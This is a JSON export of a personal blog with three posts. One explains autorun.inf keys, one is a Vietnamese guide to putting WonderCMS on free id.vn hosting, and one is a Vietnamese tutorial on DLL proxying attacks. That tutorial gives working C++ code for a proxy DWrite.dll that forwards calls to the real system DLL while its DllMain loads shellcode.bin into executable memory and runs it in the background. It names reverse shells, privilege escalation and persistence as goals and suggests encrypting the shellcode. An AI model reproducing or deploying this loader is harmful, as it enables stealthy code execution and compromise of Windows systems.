{
    "title": "Blog",
    "posts": {
        "autorun-inf-autorun-when-plug-in-usb-drive": {
            "title": "autorun.inf - Autorun when plug in USB Drive",
            "description": "This blog will explain all details about autorun.inf, a file which will guide Windows execute .exe file inside it.",
            "keywords": "#autorun, #cybersecurity",
            "date": 1746192799,
            "body": "<p data-start=\"54\" data-end=\"301\" class=\"\" align=\"left\"><strong data-start=\"54\" data-end=\"69\">Autorun.inf<\/strong> is a plain-text configuration file placed in the root of removable media.  It consists of an <code data-start=\"163\" data-end=\"174\">[autorun]<\/code> section with key-value pairs that instruct Windows which program to launch, what icon\/label to use, etc.  Common keys include:<\/p>\n<div align=\"left\"><ul data-start=\"303\" data-end=\"856\"><li data-start=\"303\" data-end=\"407\" class=\"\">\n<p data-start=\"305\" data-end=\"407\" class=\"\"><strong data-start=\"305\" data-end=\"313\">open<\/strong>: the program to execute (e.g. <code data-start=\"344\" data-end=\"360\">open=Setup.exe<\/code> runs <code data-start=\"366\" data-end=\"377\">Setup.exe<\/code> when AutoRun is triggered).<\/p>\n<\/li><li data-start=\"408\" data-end=\"494\" class=\"\">\n<p data-start=\"410\" data-end=\"494\" class=\"\"><strong data-start=\"410\" data-end=\"418\">icon<\/strong>: the icon file (or an index into an executable) to display for the drive.<\/p>\n<\/li><li data-start=\"495\" data-end=\"537\" class=\"\">\n<p data-start=\"497\" data-end=\"537\" class=\"\"><strong data-start=\"497\" data-end=\"506\">label<\/strong>: a text label for the drive.<\/p>\n<\/li><li data-start=\"538\" data-end=\"628\" class=\"\">\n<p data-start=\"540\" data-end=\"628\" class=\"\"><strong data-start=\"540\" data-end=\"550\">action<\/strong>: a custom menu text shown in the AutoPlay prompt (e.g. <code data-start=\"606\" data-end=\"624\">action=Run MyApp<\/code>).<\/p>\n<\/li><li data-start=\"629\" data-end=\"717\" class=\"\">\n<p data-start=\"631\" data-end=\"717\" class=\"\"><strong data-start=\"631\" data-end=\"647\">shellexecute<\/strong> (Vista+): like <code data-start=\"663\" data-end=\"669\">open<\/code> but uses file association to launch the file.<\/p>\n<\/li><li data-start=\"718\" data-end=\"856\" class=\"\">\n<p data-start=\"720\" data-end=\"856\" class=\"\"><strong data-start=\"720\" data-end=\"729\">shell<\/strong> entries: define one or more context-menu commands (e.g. <code data-start=\"786\" data-end=\"819\">shell\\install\\command=setup.exe<\/code> with <code data-start=\"825\" data-end=\"852\">shell\\install=Install Now<\/code>).<\/p>\n<\/li><\/ul><\/div>\n<p data-start=\"858\" data-end=\"902\" class=\"\" align=\"left\">For example, a simple autorun.inf might be:<\/p>\n<div align=\"left\"><pre class=\"overflow-visible!\" data-start=\"904\" data-end=\"983\"><div class=\"contain-inline-size rounded-md border-[0.5px] border-token-border-medium relative bg-token-sidebar-surface-primary\">[autorun]<br>open=Setup.exe<br>icon=Setup.exe,0<br>label=My Installation Disc<\/div><\/pre>This tells Windows to run <code data-start=\"1011\" data-end=\"1022\">Setup.exe<\/code> (from the drive root) and to use the first icon in <code data-start=\"1074\" data-end=\"1085\">Setup.exe<\/code> to represent the drive (<span class=\"ms-1 inline-flex max-w-full items-center relative top-[-0.094rem] animate-[show_150ms_ease-in]\"><a href=\"https:\/\/www.autoruntools.com\/autorun-inf.php#:~:text=\" target=\"_blank\" rel=\"noopener\" class=\"flex h-4.5 overflow-hidden rounded-xl px-2 text-[0.5625em] font-medium text-token-text-secondary! bg-[#F4F4F4]! dark:bg-[#303030]! transition-colors duration-150 ease-in-out\"><span class=\"relative start-0 bottom-0 flex h-full w-full items-center\"><span class=\"flex h-4 w-full items-center justify-between overflow-hidden\"><span class=\"max-w-full grow truncate overflow-hidden text-center\">autoruntools.com<\/span><\/span><\/span><\/a><\/span>).  Autorun.inf can also specify custom “right-click” menu options under the <code data-start=\"1221\" data-end=\"1230\">[shell]<\/code> heading, but by default Windows uses <code data-start=\"1268\" data-end=\"1274\">open<\/code> or <code data-start=\"1278\" data-end=\"1292\">shellexecute<\/code> to populate the AutoPlay dialog.  (AutoRun and AutoPlay are related: <strong data-start=\"1362\" data-end=\"1373\">AutoRun<\/strong> is the mechanism for automatically launching programs on media insertion, while <strong data-start=\"1454\" data-end=\"1466\">AutoPlay<\/strong> presents a user prompt with options, one of which can be the <code data-start=\"1528\" data-end=\"1534\">open<\/code> or <code data-start=\"1538\" data-end=\"1552\">shellexecute<\/code> action from autorun.inf.)<\/div><div align=\"left\"><iframe frameborder=\"0\" src=\"\/\/www.youtube.com\/embed\/vK1dUQ-TGf8\" width=\"640\" height=\"360\" class=\"note-video-clip\"><\/iframe><br><\/div>"
        },
        "dll-proxying-hijack-fresh-dll-with-not-fresh-dll": {
            "title": "DLL proxying - Chuyển hướng từ DLL \"sạch\" thành DLL \"không sạch\"",
            "description": "1 kiểu tấn công DLL hịacking cho phép lợi dụng lỗ hổng import DLL để chuyển hướng DLL \"sạch\" đi qua DLL \"không sạch\", sau đó trả hoạt động về lại cho DLL \"sạch\"",
            "keywords": "#dllhịacking, #dllproxying, #cybersecurity, #malware",
            "date": 1746351277,
            "body": "<!-- Prism CSS for default theme --><div align=\"left\">Trong ví dụ này sẽ sử dụng DLL DWrite.dll, một DLL của Windows System32. Code xây dựng DLL dựa trên ngôn ngữ C++.<\/div><div align=\"left\">Ý tưởng là ta sẽ lợi dụng lỗ hổng khi người dùng khai báo 1 DLL nhưng không chỉ rõ vị trí DLL:<\/div><div align=\"left\"><pre class=\"default s-code-block language-csharp\" tabindex=\"0\"><code data-highlighted=\"yes\" class=\"hljs language-csharp\"><span class=\"token punctuation\">[<\/span><span class=\"token attribute\"><span class=\"token class-name\">DllImport<\/span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(<\/span><span class=\"token string\">\"DWrite.dll\"<\/span><span class=\"token punctuation\">)<\/span><\/span><\/span><span class=\"token punctuation\">]<\/span> <span class=\"token comment\">\/\/ relative path; just give the DLL's name<\/span>\n<span class=\"token keyword\">static<\/span> <span class=\"token keyword\">extern<\/span> <span class=\"token return-type class-name\"><span class=\"token keyword\">bool<\/span><\/span> <span class=\"token function\">MyGreatFunction<\/span><span class=\"token punctuation\">(<\/span><span class=\"token class-name\"><span class=\"token keyword\">int<\/span><\/span> myFirstParam<span class=\"token punctuation\">,<\/span> <span class=\"token class-name\"><span class=\"token keyword\">int<\/span><\/span> mySecondParam<span class=\"token punctuation\">)<\/span><span class=\"token punctuation\">;<\/span><\/code><\/pre><\/div><div align=\"left\">Khi đó ta sẽ tạo 1 file DLL có tên là \"DWrite.dll\" nằm cùng thư mục với executable. DLL này sẽ đóng vai trò giống như 1 proxy, mọi luồng thực thi sẽ được chuyển đến DLL này trước khi đi tới DLL gốc. Trong đó ta cần làm sao để khởi chạy chương trình \"không sạch\", như tạo reverse shell, privilege escalation, persistence,... nhưng vẫn đảm bảo sẽ trỏ về DLL gốc để chương trình hoạt động bình thường. <br><\/div><div align=\"left\">Điểm quan trọng của phương pháp này là cần phải đảm bảo DLL phải được chuyển hướng về DLL \"sạch\", nó nằm ở C:\\Windows\\System32\\DWrite.dll. Để làm được điều đó, ta cần khai báo linker để trỏ tới DLL này.<\/div><div align=\"left\"><pre><code>\/\/ Linker directive to forward the export to the genuine DWrite function in DWrite.dll.\n\/\/ This makes our DLL a proxy for DWrite.DWriteCreateFactory.\n#pragma comment(linker, \"\/export:DWriteCreateFactory=C:\\\\Windows\\\\System32\\\\DWrite.DWriteCreateFactory,@1\")<\/code><\/pre>Thứ 2, khi DLL này khởi chạy, ta cần dẫn đến đoạn code \"không sạch\", có thể khởi chạy background process để đảm bảo process tiếp tục chạy kể cả khi chương trình đóng (thường là nơi ta để reverse shell)<\/div><div align=\"left\"><pre><code>BOOL APIENTRY DllMain(HMODULE hModule,\n    DWORD  ul_reason_for_call,\n    LPVOID lpReserved\n)\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n    {\n        \/\/ Perform any immediate initialization.\n        very_normal_func();\n\n        \/\/ Launch a background thread to load and execute shellcode.\n        HANDLE hThread = CreateThread(NULL, 0, ShellcodeThread, NULL, 0, NULL);\n        if (hThread)\n        {\n            \/\/ Close the thread handle; the thread continues to run independently.\n            CloseHandle(hThread);\n        }\n        break;\n    }\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n<\/code><\/pre>Ta có thể khai báo một chút code ở đầu chương trình để khởi tạo gì đó.<\/div><div align=\"left\"><pre><code>\/\/ A simple placeholder function.\nvoid very_normal_func()\n{\n    \/\/ This can be expanded if additional initialization is needed.\n}\n<\/code><\/pre><br><\/div><div align=\"left\"><p dir=\"ltr\" style=\"line-height:1.2;margin-top:0pt;margin-bottom:0pt;\" id=\"docs-internal-guid-3306f687-7fff-9537-5654-604f5652798d\">Sau đó là nơi để chương trình khởi tạo tiến trình và chạy nó background. Ở đây yêu cầu cần có file shellcode.bin, chứa shellcode để chương trình thực thi ngay lập tức trên memory (RAM).<\/p><div align=\"left\"><pre><code>\/\/ Helper function to load the shellcode from file, allocate memory with execute permissions,\n\/\/ and then run the shellcode in a separate thread.\nDWORD WINAPI ShellcodeThread(LPVOID lpParam)\n{\n    \/\/ Open the shellcode file in binary mode.\n    std::ifstream file(\"shellcode.bin\", std::ios::binary | std::ios::ate);\n    if (!file)\n    {\n        return 1; \/\/ Failed to open file.\n    }\n\n    \/\/ Get file size and allocate buffer.\n    std::streamsize size = file.tellg();\n    file.seekg(0, std::ios::beg);\n    if (size &lt;= 0)\n    {\n        return 1;\n    }\n\n    std::vector<char> buffer(size);\n    if (!file.read(buffer.data(), size))\n    {\n        return 1;\n    }\n\n    \/\/ Allocate executable memory and copy the shellcode there.\n    LPVOID exec_mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    if (!exec_mem)\n    {\n        return 1;\n    }\n\n    memcpy(exec_mem, buffer.data(), size);\n\n    \/\/ Cast the allocated memory to a function pointer and execute it.\n    \/\/ Note: this assumes the shellcode is position independent.\n    ((void(*)())exec_mem)();\n\n    \/\/ Optionally free the memory when done:\n    \/\/ VirtualFree(exec_mem, 0, MEM_RELEASE);\n\n    return 0;\n}\n<\/char><\/code><\/pre><p dir=\"ltr\" style=\"line-height:1.2;margin-top:0pt;margin-bottom:0pt;\" id=\"docs-internal-guid-3306f687-7fff-9537-5654-604f5652798d\">Tất nhiên shellcode trong ví dụ này chưa mã hóa. Bạn có thể nâng cấp bằng cách mã hóa trước shellcode bằng mã hóa AES, sau đó đưa key giải mã vào DLL này để giải mã trước khi đưa vào memory.<\/p><\/div><div align=\"left\"><link href=\"https:\/\/cdn.jsdelivr.net\/npm\/prismjs@1\/themes\/prism.css\" rel=\"stylesheet\"><script src=\"https:\/\/cdn.jsdelivr.net\/npm\/prismjs@1\/components\/prism-core.min.js\"><\/script><script src=\"https:\/\/cdn.jsdelivr.net\/npm\/prismjs@1\/components\/prism-cpp.min.js\"><\/script><script src=\"https:\/\/cdn.jsdelivr.net\/npm\/prismjs@1\/plugins\/autoloader\/prism-autoloader.min.js\"><\/script><link href=\"https:\/\/cdn.jsdelivr.net\/npm\/prismjs@1\/plugins\/line-numbers\/prism-line-numbers.css\" rel=\"stylesheet\"><script src=\"https:\/\/cdn.jsdelivr.net\/npm\/prismjs@1\/plugins\/line-numbers\/prism-line-numbers.min.js\"><\/script><\/div>\n\n<\/div>",
            "subside": "<h1>Newest Posts<\/h1>"
        },
        "song-de-hon-voi-host-free-cua-id-vn-cung-wondercms": {
            "title": "Sống dễ hơn với host Free của id.vn cùng WonderCMS",
            "description": "Các host mặc định của id.vn thường là Free Builder trong vòng 2 năm (bên cạnh thể loại tạo ra CV dựa trên template). Nhưng sẽ như thế nào nếu bạn không thích site.pro?",
            "keywords": "#keyword",
            "date": 1747019322,
            "body": "<p align=\"left\">Chào các bạn, tiếp tục là 1 blog hướng dẫn bạn đến với con đường \"tà đạo\" nhất, \"trick lỏ\" nhất. Đó chính là thêm WonderCMS, một CMS vô cùng đơn giản chỉ với 7 files khi tải từ GitHub về folder public_html của file trong  Free Builder. Bản chất sẽ khá giống với khi các bạn cài Wordpress vào server Apache, nhưng điểm khác ở đây là có giới hạn inode. Vâng các bạn không nghe nhầm đâu, những trò mà các bạn hay nghe ở 000webhost ở bản free nó vẫn xuất hiện ở những host cung cấp id.vn đấy. Cho nên, không để các bạn chờ lâu, chúng ta cùng bắt đầu thôi.<\/p><p align=\"left\">Cùng đăng ký 1 domain id.vn theo ý của các bạn, ở đây mình sẽ sử dụng VinaHost. Lưu ý là các bạn phải có CCCD ở Việt Nam và hoàn thành đăng ký trước 31\/12\/2025 để nhận ưu đãi: miễn phí tên miền trong 2 năm, miễn phí host website (đây là cái bài viết này hướng tới), miễn phí email (mình chưa biết cách hoạt động nên chưa thể làm được, mình sẽ có bài đăng sớm về nó)<\/p><p align=\"left\">Sau đó truy cập vào DirectAdmin được cung cấp, các bạn sẽ thấy:<\/p><p align=\"left\"><img src=\"http:\/\/localhost:2222\/data\/files\/image.png\" style=\"width: 50%;\"><\/p><p align=\"left\">Tất nhiên ban đầu nó sẽ không như thế này vì VinaHost sử dụng site.pro để làm nền tảng Web Builder. <br><\/p>"
        }
    }
}